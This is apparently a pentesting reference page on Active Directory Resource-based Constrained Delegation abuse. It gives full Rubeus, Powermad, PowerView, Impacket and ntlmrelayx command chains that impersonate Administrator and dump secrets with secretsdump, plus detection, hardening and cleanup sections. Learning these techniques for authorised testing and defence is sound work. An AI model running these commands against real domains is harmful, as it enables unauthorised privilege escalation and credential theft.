_body: "# Resource-based Constrained Delegation\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## Basics of Resource-based\
  \ Constrained Delegation\n\nThis is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead**\
  \ of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation\
  \ **sets** in **the object who is able to impersonate any user against it**.\n\nIn this case, the constrained object will\
  \ have an attribute called _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ with the name of the user that can impersonate\
  \ any other user against it.\n\nAnother important difference from this Constrained Delegation to the other delegations is\
  \ that any user with **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_)\
  \ can set the **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (In the other forms of Delegation you needed domain admin privs).\n\
  \n### New Concepts\n\nBack in Constrained Delegation it was told that the **`TrustedToAuthForDelegation`** flag inside the\
  \ _userAccountControl_ value of the user is needed to perform a **S4U2Self.** But that's not completely truth.\\\nThe reality\
  \ is that even without that value, you can perform a **S4U2Self** against any user if you are a **service** (have a SPN)\
  \ but, if you **have `TrustedToAuthForDelegation`** the returned TGS will be **Forwardable** and if you **don't have** that\
  \ flag the returned TGS **won't** be **Forwardable**.\n\nHowever, if the **TGS** used in **S4U2Proxy** is **NOT Forwardable**\
  \ trying to abuse a **basic Constrain Delegation** it **won't work**. But if you are trying to exploit a **Resource-Based\
  \ constrain delegation, it will work**.\n\n### Attack structure\n\n> If you have **write equivalent privileges** over a\
  \ **Computer** account you can obtain **privileged access** in that machine.\n\nSuppose that the attacker has already **write\
  \ equivalent privileges over the victim computer**.\n\n1. The attacker **compromises** an account that has a **SPN** or\
  \ **creates one** (“Service A”). Note that **any** _Admin User_ without any other special privilege can **create** up until\
  \ 10 Computer objects (**_MachineAccountQuota_**) and set them a **SPN**. So the attacker can just create a Computer object\
  \ and set a SPN.\n2. The attacker **abuses its WRITE privilege** over the victim computer (ServiceB) to configure **resource-based\
  \ constrained delegation to allow ServiceA to impersonate any user** against that victim computer (ServiceB).\n3. The attacker\
  \ uses Rubeus to perform a **full S4U attack** (S4U2Self and S4U2Proxy) from Service A to Service B for a user **with privileged\
  \ access to Service B**.\n   1. S4U2Self (from the SPN compromised/created account): Ask for a **TGS of Administrator to\
  \ me** (Not Forwardable).\n   2. S4U2Proxy: Use the **not Forwardable TGS** of the step before to ask for a **TGS** from\
  \ **Administrator** to the **victim host**.\n   3. Even if you are using a not Forwardable TGS, as you are exploiting Resource-based\
  \ constrained delegation, it will work.\n4. The attacker can **pass-the-ticket** and **impersonate** the user to gain **access\
  \ to the victim ServiceB**.\n\nTo check the _**MachineAccountQuota**_ of the domain you can use:\n\n```bash\nGet-DomainObject\
  \ -Identity \"dc=domain,dc=local\" -Domain domain.local | select MachineAccountQuota\n```\n\n## Attack\n\n### Creating a\
  \ Computer Object\n\nYou can create a computer object inside the domain using **[powermad](https://github.com/Kevin-Robertson/Powermad):**\n\
  \n```bash\nimport-module powermad\nNew-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456'\
  \ -AsPlainText -Force) -Verbose\n\n# Check if created\nGet-DomainComputer SERVICEA\n```\n\n### Configuring Resource-based\
  \ Constrained Delegation\n\n**Using activedirectory PowerShell module**\n\n```bash\nSet-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount\
  \ SERVICEA$ #Assing delegation privileges\nGet-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount\
  \ #Check that it worked\n```\n\n**Using powerview**\n\n```bash\n$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties\
  \ objectsid | Select -Expand objectsid\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)\"\
  \n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\nGet-DomainComputer $targetComputer |\
  \ Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n\n#Check that it worked\nGet-DomainComputer\
  \ $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'\n\nmsds-allowedtoactonbehalfofotheridentity\n----------------------------------------\n\
  {1, 0, 4, 128...}\n```\n\n### Performing a complete S4U attack (Windows/Rubeus)\n\nFirst of all, we created the new Computer\
  \ object with the password `123456`, so we need the hash of that password:\n\n```bash\n.\\Rubeus.exe hash /password:123456\
  \ /user:FAKECOMPUTER$ /domain:domain.local\n```\n\nThis will print the RC4 and AES hashes for that account.\\\nNow, the\
  \ attack can be performed:\n\n```bash\nrubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4\
  \ hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt\n```\n\nYou can generate\
  \ more tickets for more services just asking once using the `/altservice` param of Rubeus:\n\n```bash\nrubeus.exe s4u /user:FAKECOMPUTER$\
  \ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap\
  \ /domain:domain.local /ptt\n```\n\n> [!CAUTION]\n> Note that users have an attribute called \"**Cannot be delegated**\"\
  . If a user has this attribute to True, you won't be able to impersonate him. This property can be seen inside bloodhound.\n\
  \n### Linux tooling: end-to-end RBCD with Impacket (2024+)\n\nIf you operate from Linux, you can perform the full RBCD chain\
  \ using the official Impacket tools:\n\n```bash\n# 1) Create attacker-controlled machine account (respects MachineAccountQuota)\n\
  impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'\n\
  \n# 2) Grant RBCD on the target computer to FAKE01$\n#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity\n\
  impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'\n\
  \n# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service\nimpacket-getST\
  \ -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'\n\n# 4) Use\
  \ the ticket (ccache) against the target service\nexport KRB5CCNAME=$(pwd)/Administrator.ccache\n# Example: dump local secrets\
  \ via Kerberos (no NTLM)\nimpacket-secretsdump -k -no-pass Administrator@victim.domain.local\n```\n\nNotes\n- If LDAP signing/LDAPS\
  \ is enforced, use `impacket-rbcd -use-ldaps ...`.\n- Prefer AES keys; many modern domains restrict RC4. Impacket and Rubeus\
  \ both support AES-only flows.\n- Impacket can rewrite the `sname` (\"AnySPN\") for some tools, but obtain the correct SPN\
  \ whenever possible (e.g., CIFS/LDAP/HTTP/HOST/MSSQLSvc).\n\n## Cross-domain & cross-forest RBCD\n\nIf the **delegating\
  \ principal** you control lives in a **different domain** (or even a **different forest**) than the **resource computer**,\
  \ the abuse is still **RBCD**, but the ticket flow is no longer the usual single-domain `S4U2Self -> S4U2Proxy`.\n\n###\
  \ Cross-domain RBCD: configure the foreign principal by SID\n\nWhen you set `msDS-AllowedToActOnBehalfOfOtherIdentity` from\
  \ a **different domain**, the foreign machine/user might **not be resolvable by name** in the target domain LDAP. In that\
  \ case, configure the delegation entry using the **SID** of the foreign principal instead of its sAMAccountName/UPN.\n\n\
  This is especially relevant when relaying NTLM to LDAP with `ntlmrelayx.py`:\n\n```bash\nsudo ntlmrelayx.py -smb2support\
  \ -t ldap://192.168.90.217 \\\n  --no-dump --no-da --no-validate-privs \\\n  --delegate-access \\\n  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106\
  \ \\\n  --sid\n```\n\nNotes:\n- `--sid` tells `ntlmrelayx.py` to treat `--escalate-user` as a SID, which is required when\
  \ the delegating account is foreign to the target domain.\n- Even if the tool prints `User not found in LDAP`, the delegation\
  \ write can still succeed because the security descriptor stores the foreign SID directly.\n\n### Cross-domain RBCD: cross-realm\
  \ S4U sequence\n\nOnce the foreign principal is in `msDS-AllowedToActOnBehalfOfOtherIdentity`, the working cross-domain\
  \ flow is:\n\n1. Get a **TGT** for the delegating principal from its own domain.\n2. Request a **referral TGT** for `krbtgt/<target-domain>`.\n\
  3. Request a **cross-realm S4U2Self referral** for the impersonated user on the target-domain DC.\n4. Request the actual\
  \ **S4U2Self** ticket for that user back in the delegator domain.\n5. Perform **S4U2Proxy** in the delegator domain to get\
  \ a referral ticket for the target domain.\n6. Perform the final **S4U2Proxy** on the target-domain DC to obtain the service\
  \ ticket for `cifs/host.target`, `host/host.target`, etc.\n\nThis is why stock Linux tooling often fails in cross-domain\
  \ RBCD:\n- the request **realm** may need to differ from the realm of the TGT used in the `TGS-REQ`\n- the chain needs **independent\
  \ S4U2Proxy steps**, not only `S4U2Self` or `S4U2Self` immediately followed by a single `S4U2Proxy`\n\n### Cross-domain\
  \ RBCD from Linux\n\nSynacktiv published an Impacket `getST.py` implementation that reproduces the cross-realm sequence\
  \ from Linux by explicitly handling the two KDCs:\n\n```bash\npython3 ./getST.py dev.asgard.local/rbcd_test\\$:R[...]5 -k\
  \ \\\n  -dc-ip 192.168.90.131 \\\n  -targetdc 192.168.90.217 \\\n  -targetdomain asgard.local \\\n  -impersonate thor_adm\
  \ \\\n  -spn cifs/workstation.asgard.local\n\nKRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \\\n\
  \  ./smbclient.py \"asgard.local/thor_adm@workstation.asgard.local\" \\\n  -k -no-pass -dc-ip 192.168.90.217\n```\n\nOperationally,\
  \ the new arguments are:\n- `-dc-ip`: DC of the **delegating** domain\n- `-targetdomain`: domain of the **resource computer**\n\
  - `-targetdc`: DC of the **resource** domain\n\n### Cross-forest RBCD limitations\n\nCross-forest RBCD has an important\
  \ limitation: **the impersonated user must belong to the same forest as the delegating principal**. In other words, if your\
  \ controlled machine account is in `valhalla.local` and the target resource is in `asgard.local`, you generally **cannot**\
  \ impersonate arbitrary `asgard.local` users to that resource via RBCD.\n\nIt is still exploitable when:\n- the **delegating\
  \ forest** user is a **local admin** (or otherwise privileged) on the resource host in the other forest\n- a trust allows\
  \ the required authentication path and the foreign SID is accepted in the target computer's security descriptor\n\n### Cross-forest\
  \ RBCD protocol quirks\n\nCross-forest RBCD is not just \"cross-domain plus a trust\". The observed flow includes two quirks\
  \ that common tooling historically misses:\n\n1. An extra **S4U2Proxy** request that sets **`PA-PAC-OPTIONS=branch-aware`**\n\
  2. A final service ticket that may be returned using **RC4** even when other etypes were requested\n\nThe practical flow\
  \ is:\n\n1. Get a TGT for the delegating principal in forest A.\n2. Request **S4U2Self** for the impersonated user in forest\
  \ A.\n3. Request **S4U2Proxy** in forest A to obtain a referral TGT for forest B.\n4. Send a second **S4U2Proxy** in forest\
  \ A **without** the S4U2Self ticket as an additional ticket, but with `branch-aware` enabled, to obtain another referral\
  \ TGT for forest B.\n5. Optionally request a normal service ticket in forest B for the delegating principal (this ticket\
  \ is not required for the final abuse).\n6. Use the referral tickets from steps 3 and 4 to request the final **S4U2Proxy**\
  \ ticket in forest B for the impersonated forest-A user to the target SPN.\n\n### Cross-forest RBCD from Linux\n\nThe same\
  \ Synacktiv Impacket branch adds a `-forest` switch for this logic:\n\n```bash\npython3 ./getST.py -spn 'cifs/workstation.asgard.local'\
  \ \\\n  -impersonate 'v_thor' \\\n  -dc-ip VALHALLA.local \\\n  valhalla.local/'desktop$' \\\n  -targetdc ASGARD.local \\\
  \n  -targetdomain asgard.local \\\n  -aesKey 4[...]f \\\n  -forest\n```\n\n## Detection / hardening notes\n\n- RBCD paths\
  \ across domains/forests are still usually created through **ACL abuse** or **relay-to-LDAP**. Enforce **LDAP signing**\
  \ and **LDAP channel binding** on DCs to break common setup paths.\n- Audit who can write `msDS-AllowedToActOnBehalfOfOtherIdentity`\
  \ on computer objects and resolve the stored SIDs, including **foreign security principals**.\n- In trust-heavy environments,\
  \ review **Selective Authentication**, **SID filtering**, and whether users from a foreign forest hold **local admin** rights\
  \ on resource hosts.\n\n### Accessing\n\nThe last command line will perform the **complete S4U attack and will inject the\
  \ TGS** from Administrator to the victim host in **memory**.\\\nIn this example it was requested a TGS for the **CIFS**\
  \ service from Administrator, so you will be able to access **C$**:\n\n```bash\nls \\\\victim.domain.local\\C$\n```\n\n\
  ### Abuse different service tickets\n\nLearn about the [**available service tickets here**](silver-ticket.md#available-services).\n\
  \n## Enumerating, auditing and cleanup\n\n### Enumerate computers with RBCD configured\n\nPowerShell (decoding the SD to\
  \ resolve SIDs):\n\n```powershell\n# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals\n\
  Import-Module ActiveDirectory\nGet-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |\n  Where-Object\
  \ { $_.\"msDS-AllowedToActOnBehalfOfOtherIdentity\" } |\n  ForEach-Object {\n    $raw = $_.\"msDS-AllowedToActOnBehalfOfOtherIdentity\"\
  \n    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0\n    $sd.DiscretionaryAcl | ForEach-Object\
  \ {\n      $sid  = $_.SecurityIdentifier\n      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch\
  \ { $name = $sid.Value }\n      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask\
  \ }\n    }\n  }\n```\n\nImpacket (read or flush with one command):\n\n```bash\n# Read who can delegate to VICTIM\nimpacket-rbcd\
  \ -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'\n```\n\n### Cleanup / reset RBCD\n\n- PowerShell (clear\
  \ the attribute):\n\n```powershell\nSet-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'\n#\
  \ Or using the friendly property\nSet-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null\n```\n\n- Impacket:\n\
  \n```bash\n# Remove a specific principal from the SD\nimpacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action\
  \ remove 'domain.local/jdoe:Summer2025!'\n# Or flush the whole list\nimpacket-rbcd -delegate-to 'VICTIM$' -action flush\
  \ 'domain.local/jdoe:Summer2025!'\n```\n\n## Kerberos Errors\n\n- **`KDC_ERR_ETYPE_NOTSUPP`**: This means that kerberos\
  \ is configured to not use DES or RC4 and you are supplying just the RC4 hash. Supply to Rubeus at least the AES256 hash\
  \ (or just supply it the rc4, aes128 and aes256 hashes). Example: `[Rubeus.Program]::MainString(\"s4u /user:FAKECOMPUTER\
  \ /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F\
  \ /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt\".split())`\n- **`KRB_AP_ERR_SKEW`**: This means that\
  \ the time of the current computer is different from the one of the DC and kerberos is not working properly.\n- **`preauth_failed`**:\
  \ This means that the given username + hashes aren't working to login. You may have forgotten to put the \"$\" inside the\
  \ username when generating the hashes (`.\\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)\n\
  - **`KDC_ERR_BADOPTION`**: This may mean:\n  - The user you are trying to impersonate cannot access the desired service\
  \ (because you cannot impersonate it or because it doesn't have enough privileges)\n  - The asked service doesn't exist\
  \ (if you ask for a ticket for winrm but winrm isn't running)\n  - The fakecomputer created has lost it's privileges over\
  \ the vulnerable server and you need to given them back.\n  - You are abusing classic KCD; remember RBCD works with non-forwardable\
  \ S4U2Self tickets, while KCD requires forwardable.\n\n## Notes, relays and alternatives\n\n- You can also write the RBCD\
  \ SD over AD Web Services (ADWS) if LDAP is filtered. See:\n\n\n{{#ref}}\nadws-enumeration.md\n{{#endref}}\n\n- Kerberos\
  \ relay chains frequently end in RBCD to achieve local SYSTEM in one step. See practical end-to-end examples:\n\n\n{{#ref}}\n\
  ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md\n\
  {{#endref}}\n\n- If LDAP signing/channel binding are **disabled** and you can create a machine account, tools like **KrbRelayUp**\
  \ can relay a coerced Kerberos auth to LDAP, set `msDS-AllowedToActOnBehalfOfOtherIdentity` for your machine account on\
  \ the target computer object, and immediately impersonate **Administrator** via S4U from off-host.\n\n## References\n\n\
